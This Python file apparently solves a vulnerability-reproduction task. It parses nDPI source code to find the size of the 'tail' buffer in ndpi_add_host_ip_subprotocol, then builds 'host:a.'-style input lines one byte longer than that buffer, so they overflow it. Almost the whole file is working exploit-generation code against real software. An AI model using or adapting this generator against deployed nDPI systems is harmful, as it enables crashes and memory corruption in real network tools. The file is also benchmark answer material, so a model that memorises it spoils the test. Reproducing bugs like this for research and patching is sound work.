import os
import re
import tarfile


class Solution:
    def _read_tar_text_files(self, src_path):
        texts = {}
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name
                    # Only consider plausible source files to minimize decoding
                    if name.endswith((".c", ".h", ".cpp", ".hpp")):
                        try:
                            with tf.extractfile(m) as f:
                                data = f.read()
                            text = data.decode("utf-8", errors="ignore")
                            texts[name] = text
                        except Exception:
                            continue
        except Exception:
            # If not a tar file, try reading files from directory
            if os.path.isdir(src_path):
                for root, _, files in os.walk(src_path):
                    for fn in files:
                        if fn.endswith((".c", ".h", ".cpp", ".hpp")):
                            p = os.path.join(root, fn)
                            try:
                                with open(p, "rb") as f:
                                    data = f.read()
                                text = data.decode("utf-8", errors="ignore")
                                texts[p] = text
                            except Exception:
                                continue
        return texts

    def _find_function_body(self, code, func_name):
        # Find function definition start
        pattern = re.compile(r'\b' + re.escape(func_name) + r'\s*\(')
        m = pattern.search(code)
        if not m:
            return None
        # Find opening brace after the parameters
        idx = code.find('{', m.end())
        if idx == -1:
            return None
        # Naive brace matching
        level = 0
        i = idx
        n = len(code)
        while i < n:
            c = code[i]
            if c == '{':
                level += 1
            elif c == '}':
                level -= 1
                if level == 0:
                    return code[idx:i + 1]
            i += 1
        return None

    def _extract_tail_size(self, func_body):
        if not func_body:
            return None
        # Try to find declaration like: char tail[NN];
        # Accept possible qualifiers before char (e.g., static char tail[NN];)
        m = re.search(r'\bchar\s+tail\s*\[\s*(\d+)\s*\]', func_body)
        if m:
            try:
                return int(m.group(1))
            except Exception:
                pass
        # Try substrings like: u_char tail[NN]; or unsigned char tail[NN];
        m = re.search(r'\b(?:unsigned\s+)?char\s+tail\s*\[\s*(\d+)\s*\]', func_body)
        if m:
            try:
                return int(m.group(1))
            except Exception:
                pass
        # Generic match: any type ... tail[NN];
        m = re.search(r'\b[A-Za-z_][A-Za-z0-9_*\s]*\s+tail\s*\[\s*(\d+)\s*\]', func_body)
        if m:
            try:
                return int(m.group(1))
            except Exception:
                pass
        return None

    def _guess_tail_size(self, texts):
        # Prefer ndpi_main.c
        candidates = []
        for path, txt in texts.items():
            base = os.path.basename(path)
            if base == "ndpi_main.c":
                candidates.insert(0, (path, txt))
            else:
                candidates.append((path, txt))
        for path, txt in candidates:
            if "ndpi_add_host_ip_subprotocol" in txt:
                body = self._find_function_body(txt, "ndpi_add_host_ip_subprotocol")
                sz = self._extract_tail_size(body)
                if sz:
                    return sz
        return None

    def solve(self, src_path: str) -> bytes:
        texts = self._read_tar_text_files(src_path)
        tail_size = self._guess_tail_size(texts)
        if tail_size is None:
            # Reasonable fallback guess; typical small fixed-size buffer in such bugs
            tail_size = 32

        # Minimal overflow: tail receives via sscanf("%[^.].%s", head, tail) or similar,
        # so use "a." + 'b'*(tail_size+1) to exceed tail by 1 byte.
        overflow_len = tail_size + 1
        tail_payload = "b" * overflow_len

        # Create multiple plausible lines to maximize chance across harnesses
        # 1) A direct host-like string that would be passed directly to the vulnerable function
        # 2) A "host:"-prefixed variant commonly used in custom rules files
        lines = [
            "host:a." + tail_payload,
            "a." + tail_payload,
        ]
        payload = ("\n".join(lines) + "\n").encode("ascii", errors="ignore")
        return payload
